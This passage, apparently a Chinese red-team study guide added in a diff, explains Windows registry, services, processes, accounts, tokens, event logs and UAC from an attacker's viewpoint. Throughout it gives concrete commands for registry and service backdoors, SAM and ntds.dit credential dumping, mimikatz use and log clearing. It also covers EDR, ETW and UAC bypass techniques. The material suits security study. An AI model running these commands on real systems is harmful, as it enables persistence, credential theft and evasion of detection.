+  - Token窃取(Steal Token):复制SYSTEM令牌到自己进程->提权
+  - 进程注入: 向远程进程写入Shellcode然后执行
+  - PE文件格式: 恶意软件开发、免杀、混淆的基础
+
+================================================================================
+十一、注册表基础
+================================================================================
+
+注册表(Registry)是Windows的中央配置数据库，是分层的树形数据库。
+
+【五大根键(Hive)】
+  HKEY_LOCAL_MACHINE  (HKLM)  - 计算机全局设置(所有用户共享，最重要!)
+  HKEY_CURRENT_USER   (HKCU)  - 当前登录用户设置
+  HKEY_CLASSES_ROOT   (HKCR)  - 文件类型关联和COM对象注册
+  HKEY_USERS          (HKU)   - 所有用户的Profile(含未登录用户的HKCU)
+  HKEY_CURRENT_CONFIG (HKCC)  - 当前硬件Profile(启动时从HKLM复制)
+
+【数据单元】
+  Key (键):          类似文件夹，可嵌套子键
+  Value (值):        键中的数据项，有名称(Name)、类型(Type)、数据(Data)
+  数据类型:
+    REG_SZ          - 固定长度字符串
+    REG_DWORD       - 32位整数(双字)
+    REG_QWORD       - 64位整数
+    REG_BINARY      - 二进制数据
+    REG_MULTI_SZ    - 多行字符串(NULL分隔)
+    REG_EXPAND_SZ   - 可展开字符串(含%SYSTEMROOT%等环境变量)
+
+【红队关键注册表位置】
+
+系统信息与版本：
+  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+    ProductName        - "Windows 10 Pro"
+    BuildLab           - 完整构建号
+    EditionID          - 版本标识
+    RegisteredOwner    - 注册所有者(OSINT)
+
+启动项/持久化(Autostart):
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run        # 所有用户
+  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run        # 当前用户
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce    # 下次启动运行一次
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices # 服务启动
+  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+    Shell = explorer.exe (可改为恶意程序)
+    Userinit = userinit.exe,malware.exe (逗号分隔!添加第二个程序)
+  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
+    (IFEO, 劫持进程——如劫持sethc.exe粘滞键启动CMD)
+
+服务管理：
+  HKLM\SYSTEM\CurrentControlSet\Services
+  每个子键代表一个服务，内部有ImagePath(可执行程序路径)
+
+用户信息：
+  HKLM\SAM         - 本地安全账户管理器数据库(加密，SYSTEM权限才能读)
+  HKLM\SECURITY    - 系统安全策略和缓存凭证
+
+网络配置：
+  HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces
+    - 每个网络接口配置(含IP、子网掩码、网关、DNS)
+    - 可能包含历史配置信息(泄露内部架构)
+
+RDP配置：
+  HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+    PortNumber - RDP端口(默认3389，可能已修改)
+    fDenyTSConnections - 是否禁用RDP(0=启用, 1=禁用)
+
+UAC设置：
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+    EnableLUA - 是否启用UAC (1=启用, 0=禁用)
+    ConsentPromptBehaviorAdmin - UAC弹窗行为(5=最高)
+
+Winlogon脚本：
+  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+    Userinit = C:\Windows\system32\userinit.exe,evil.exe  (持久化)
+
+【reg命令操作示例】
+  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+  reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe" /f
+  reg delete "HKLM\..." /v ValueName /f
+  reg save HKLM\SAM sam.hive              # 导出SAM(需管理员以上)
+  reg save HKLM\SYSTEM system.hive        # 导出SYSTEM(解密SAM需要)
+  reg load HKLM\TempHive C:\path\hive     # 加载离线hive
+
+================================================================================
+十二、服务与进程
+================================================================================
+
+【Windows服务】
+通过服务控制管理器(SCM, services.exe)管理的后台进程。
+
+服务管理命令(cmd):
+  sc query              # 查询所有服务状态
+  sc queryex servicename # 查询某服务详细信息
+  sc qc servicename      # 查询服务配置
+  sc start/stop servicename  # 启动/停止服务
+  sc config servicename binPath= "C:\malware.exe"  # 修改服务可执行路径
+  sc create Backdoor binPath= "C:\temp\back.exe" start= auto  # 创建新服务
+  sc delete servicename   # 删除服务
+
+  替代方式:
+  wmic service get name,displayname,pathname,startmode /format:csv
+  net start / net stop
+
+PowerShell:
+  Get-Service | ft Name,Status,StartType
+  Get-Service -Name "Spooler" | Select *
+  New-Service -Name "Backdoor" -BinaryPathName "C:\temp\back.exe" -StartupType Automatic
+
+【关键系统进程】
+  System (PID 4)        - 内核(System进程，非exe，内核线程)
+  smss.exe              - 会话管理器(Session Manager)
+  csrss.exe             - 客户端/服务器运行时子系统(Client/Server Runtime)
+  wininit.exe           - Windows初始化进程
+  services.exe          - 服务控制管理器(SCM)
+  lsass.exe             - 本地安全认证子系统(Local Security Authority)
+                           存储凭证: 明文/哈希/Kerberos票据
+  svchost.exe           - 服务宿主进程(一个进程承载多个dll服务)
+  winlogon.exe          - 登录管理器(处理登录/注销，用户init)
+  explorer.exe          - Windows桌面UI和文件管理器
+
+红队注意:
+  - lsass.exe是凭证窃取的首要目标(mimikatz sekurlsa::logonpasswords)
+  - svchost.exe承载什么服务？tasklist /svc 查看
+  - 恶意软件常使用名称伪装: svch0st.exe, lssas.exe, exp1orer.exe
+  - System PID 4的Token可窃取(GetSystem技术)
+
+【进程查看与操作】
+  tasklist              # 基本进程列表
+  tasklist /svc         # 显示每个进程承载的服务(重要!)
+  tasklist /m           # 显示进程加载的DLL列表
+  tasklist /v           # 详细信息(含窗口标题)
+  tasklist /fi "STATUS eq running"  # 过滤运行中的进程
+  tasklist /fi "IMAGENAME eq svchost.exe" /svc  # 查看svchost承载服务
+  taskkill /PID 1234 /F   # 强制终止进程
+
+PowerShell:
+  Get-Process | ft Name, Id, CPU
+  Get-Process | Where-Object {$_.CPU -gt 10} | Sort-Object CPU -Descending
+  (Get-Process -Id 1234).Modules | ft ModuleName, FileName  # 查看DLL
+  Stop-Process -Id 1234 -Force
+
+WMIC:
+  wmic process get Name,ProcessId,CommandLine  # 含启动命令行(重要!)
+  wmic process where name="notepad.exe" get ProcessId,ExecutablePath
+  wmic process call create "calc.exe"  # 远程创建进程
+
+【进程注入技术（红队核心）】
+  1. Classic DLL Injection
+     VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
+     向远程进程写入DLL路径字符串，创建远程线程调用LoadLibrary
+
+  2. Process Hollowing
+     CREATE_SUSPENDED创建一个合法进程，卸载其原始镜像
+     VirtualAllocEx写入恶意代码，ResumeThread执行
+     进程显示为合法进程名(如svchost.exe)
+
+  3. Reflective DLL Injection
+     DLL不落地(无文件)，从内存直接加载
+     反射式加载器解析PE头，自己完成LoadLibrary的工作
+
+  4. APC Injection (Asynchronous Procedure Call)
+     利用目标线程的APC队列注入代码
+     APC在下次线程被调度时执行
+
+  5. Process Doppelganging
+     利用NTFS事务，修改事务中的可执行文件但不提交
+     从内存中创建进程映像
+
+  6. DLL Side-Loading
+     利用合法应用的DLL搜索顺序，放置同名恶意DLL
+
+绕过EDR的关键：
+  大多数EDR通过Hook ntdll.dll的导出函数(syscall stub)来拦截系统调用
+  绕过方法:
+    - 直接syscall(自己实现syscall指令，跳过ntdll)
+    - Unhooking(从磁盘加载一份干净的ntdll.dll覆盖被hook的)
+    - 使用间接syscall(系统调用号从ntdll读取但不走其stub)
+    - 利用Windows回调函数(Callback)执行Shellcode
+
+================================================================================
+十三、用户与组
+================================================================================
+
+【用户账户存储】
+本地账户:
+  C:\Windows\System32\config\SAM  (Security Account Manager)
+  加密存储，只能由SYSTEM权限访问
+  提取方法:
+    reg save HKLM\SAM sam.hive && reg save HKLM\SYSTEM system.hive
+    然后用impacket-secretsdump从hive提取哈希
+    mimikatz: privilege::debug -> token::elevate -> lsadump::sam
+
+域账户:
+  存储在域控制器(DC)上
+  C:\Windows\NTDS\ntds.dit  (Active Directory数据库)
+  提取方法:
+    ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+    vssadmin create shadow /for=C:
+    copy \\?\GLOBALROOT\Device\...\ntds.dit
+
+【常用内置用户组】
+  Administrators         - 管理员组(完全控制，默认账号Administrator)
+  Users                  - 普通用户(默认新用户加入此组)
+  Guests                 - 来宾账户(默认禁用)
+  Power Users            - 高级用户(几乎等于Admin，不常用)
+  Remote Desktop Users   - 远程桌面登录权限
+  Remote Management Users - WinRM远程管理权限
+  Backup Operators       - 备份操作员(可绕过NTFS权限读取任意文件!)
+  Event Log Readers      - 事件日志读取权限
+  Distributed COM Users  - DCOM使用权限(可远程横向)
+  Network Configuration Operators - 网络配置权限
+
+【SID (Security Identifier)】
+  示例: S-1-5-21-3623811015-3361044348-30300820-1013
+         | | |  +---------- RID (相对标识符)
+         | | +------------- 域/计算机标识符
+         | +--------------- 标识符颁发机构
+         +----------------- SID修订号
+
+常用RID:
+  RID 500   - 内置Administrator账户
+  RID 501   - 内置Guest账户
+  RID 502   - krbtgt账户(域控上，Kerberos KDC服务账户)
+  RID 512   - Domain Admins组
+  RID 513   - Domain Users组
+  RID 519   - Enterprise Admins组
+  RID 1000+ - 普通用户(从1000开始)
+
+【红队常用用户/组命令】
+  whoami /all            # 显示当前用户所有信息(用户、组、特权、令牌)
+  whoami /priv           # 列出当前进程的Windows特权
+  whoami /groups         # 列出当前用户所属组及完整性级别
+  net user               # 查看本地所有用户
+  net user username      # 查看特定用户详细信息
+  net user username password /add       # 创建用户
+  net user username /active:yes/no      # 启用/禁用用户
+  net user username /delete             # 删除用户
+  net localgroup                         # 查看所有本地组
+  net localgroup Administrators          # 查看管理员组成员
+  net localgroup Administrators username /add  # 添加用户到管理员组
+  net group /domain                     # 查看域组(域环境)
+  net group "Domain Admins" /domain     # 查看域管理员组(域环境)
+
+【Token令牌】
+  Primary Token:      进程的主令牌，确定进程安全上下文
+  Impersonation Token: 模拟其他用户的令牌(服务模拟客户端时使用)
+
+Token包含:
+  - 用户SID
+  - 组SID列表
+  - 特权列表(Privileges)
+  - 完整性级别(Integrity Level)
+  - 会话ID(Session ID)
+
+Token相关攻击:
+  1. Token窃取(Token Stealing):
+     找到SYSTEM权限进程的Token，复制到自己的进程
+     incognito模块: list_tokens -u, impersonate_token "NT AUTHORITY\SYSTEM"
+     CobaltStrike: steal_token PID
+  2. Token会话劫持:
+     跨Session访问(如从Session 0访问用户Session)
+
+================================================================================
+十四、事件日志
+================================================================================
+
+Windows事件日志是检测和取证的核心数据源。
+
+日志查看方式：
+  eventvwr.msc                     # 图形化事件查看器
+  wevtutil el                      # 枚举所有日志提供者
+  wevtutil qe Security /c:5 /rd:true /f:text  # 查询最近5条安全日志
+  Get-WinEvent -LogName Security -MaxEvents 5 | ft TimeCreated,Id,Message
+  Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -MaxEvents 5
+
+【关键安全日志(Security)事件ID】
+
+登录相关:
+  4624  - 账户成功登录(含登录类型: 2=Console, 3=Network, 10=RemoteInteractive)
+  4625  - 账户登录失败(含失败原因: 0xC000006A=错误密码, 0xC0000071=密码过期)
+  4634  - 账户注销
+  4647  - 用户发起注销
+  4648  - 使用显式凭据尝试登录(runas, psexec等)
+  4672  - 为新登录分配特殊权限(管理员登录)
+  4776  - 域控尝试验证凭据(NTLM认证)
+
+账户管理:
+  4720  - 用户账户创建
+  4722  - 用户账户启用
+  4725  - 用户账户禁用
+  4726  - 用户账户删除
+  4728  - 成员添加到启用安全的全局组
+  4732  - 成员添加到启用安全的本地组(如加入Administrators)
+
+其他:
+  4698  - 计划任务创建
+  4699  - 计划任务删除
+  4702  - 计划任务更新
+  1102  - 审计日志被清除(!!!这是清除日志本身产生的日志)
+  4688  - 新进程创建(需要审计策略)
+  4104  - PowerShell脚本块记录
+  4103  - PowerShell模块日志/管道执行
+
+【Sysmon (System Monitor) 事件ID】
+Sysmon需要单独安装(微软SysInternals)，提供高级监控:
+  1   - 进程创建(含完整命令行! 非常重要的取证源)
+  3   - 网络连接(进程+IP+端口)
+  7   - 镜像加载(DLL加载到进程)
+  8   - CreateRemoteThread(检测远程线程注入)
+  10  - 进程访问(检测OpenProcess, 读内存等)
+  11  - 文件创建(FileCreate)
+  12  - 注册表对象添加/删除
+  13  - 注册表值设置
+  14  - 注册表对象重命名
+  22  - DNS查询(DNSEvent)
+
+【红队日志操作策略】
+
+1. 信息收集(从日志获取情报):
+   - 4624确认管理员活跃时间段
+   - 4688/进程创建了解安全软件(EDR/AV进程)
+   - Sysmon事件ID 3了解网络环境和连接模式
+
+2. 规避检测:
+   - 了解哪些操作会产生日志
+   - 例如: whoami产生4688; mimikatz在Sysmon中产生多个事件
+   - 使用更隐蔽的替代命令
+   - 必要时绕过ETW(Event Tracing for Windows，Windows的日志跟踪基础设施)
+     Patch EtwEventWrite来禁用日志
+
+3. 痕迹清除:
+   wevtutil cl Security       # 清除安全日志(会产生Event 1102!)
+   wevtutil cl System         # 清除系统日志
+   wevtutil cl Application    # 清除应用程序日志
+   更好的做法: 删除特定记录而非全清
+   或者: 暂停日志服务(会被检测)
+   终极方案: 关掉ETW内核(高风险!)
+
+================================================================================
+十五、权限模型 (UAC + Integrity Level)
+================================================================================
+
+【UAC (User Account Control)】
+从Vista开始引入的安全机制，即使管理员也默认以标准用户令牌运行。
+需要提升权限时弹出确认对话框。
+
+关键注册表:
+  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+    EnableLUA = 1         # 启用UAC
+    ConsentPromptBehaviorAdmin = 5  # 非内置管理员的UAC行为
+      0=不提示(自动拒绝), 2=只提示同意, 5=提示输入凭据
+
+UAC绕过技术(红队核心):
+  1. DLL劫持: 利用需提升权限的系统程序，在搜索路径中放置恶意DLL
+  2. COM劫持: 替换COM对象的注册，让高权限程序加载恶意DLL
+  3. 注册表劫持: 修改系统进程的依赖项
+  4. Elevated COM接口(如ICMLuaUtil): 利用系统的高权限COM对象直接执行代码
+  5. SilentCleanup: 利用Windows任务清理程序的自动提权
+  6. fodhelper: 利用Windows FOD helper绕过UAC
+  7. 常见UAC Bypass工具: UACMe (GitHub开源)
+
+【Integrity Level (完整性级别)】
+Windows Vista引入的强制完整性控制(MIC, Mandatory Integrity Control)
+
+完整性级别从低到高:
+  Untrusted       - 最低(匿名用户)
+  Low             - 低(如IE保护模式、Chrome沙箱)
+  Medium          - 标准用户(默认登录级别)
+  High            - 管理员权限(提升后)
+  System          - SYSTEM账户(最高)
+
+查看当前完整性级别:
+  whoami /groups   # 查找Mandatory Label项
+  或: Process Explorer查看Process Integrity
+
+完整性级别规则:
+  - 低完整性级别不能写高完整性级别的对象
+  - 高完整性级别可以读/写低完整性级别的对象
+  - 示例: IE保护模式(Low)不能修改系统文件(Medium/High)
+  - 即使都是同一用户，不同完整性级别的进程也不能互相写
+
+红队关注:
+  - UAC绕过是将进程从Medium提升到High
+  - 提升到System需要额外的提权(如服务利用)
+  - 沙箱逃逸通常是从Low/Untrusted跳到Medium或更高
+  - 某些持久化方式需要在特定完整性级别才有效
+
+================================================================================
+                第三部分：红队视角总结
+================================================================================
+
+红队必须掌握的操作系统技能：
+
+Linux方面:
+  1. 熟悉FHS，能快速找到配置、日志、凭证
+  2. 理解文件权限和SUID/SGID提权
+  3. 掌握进程管理和信号操作(杀进程、暂停进程)
+  4. 能熟练使用systemctl管理服务(持久化)
+  5. 理解日志系统，知道如何清除痕迹
+  6. 了解SELinux/AppArmor的限制和绕过方法
+  7. 能手工写systemd服务用于持久化
+
+Windows方面:
+  1. 理解NT架构(用户态/内核态分界线)
+  2. 掌握注册表关键位置(启动项、服务、凭证)
+  3. 理解进程注入技术原理
+  4. 熟悉令牌体系(Token)和提权方式
+  5. 了解事件日志结构和清除方法
+  6. 掌握UAC绕过和完整性级别概念
+  7. 会使用PowerShell进行系统管理
+
+推荐学习路径:
+  1. 日常使用Linux命令行(不用GUI，全部命令操作)
+  2. 用Linux做所有渗透测试工作
+  3. 在虚拟机中搭建各种Windows版本(2008/2012/2016/2019/10/11)
+  4. 学习PowerShell基础
+  5. 实验进程注入和令牌窃取
+  6. 练习日志清除和痕迹擦除
+
+推荐工具清单:
+  Linux:  nc, socat, chisel, Ligolo-ng, pspy, linpeas, pwncat
+  Windows: mimikatz, rundll32, certutil, powershell, bitsadmin, mshta
+  SysInternals: ProcessExplorer, ProcessMonitor, Autoruns, TCPView
+
+================================================================================
+                        文档结束
+================================================================================
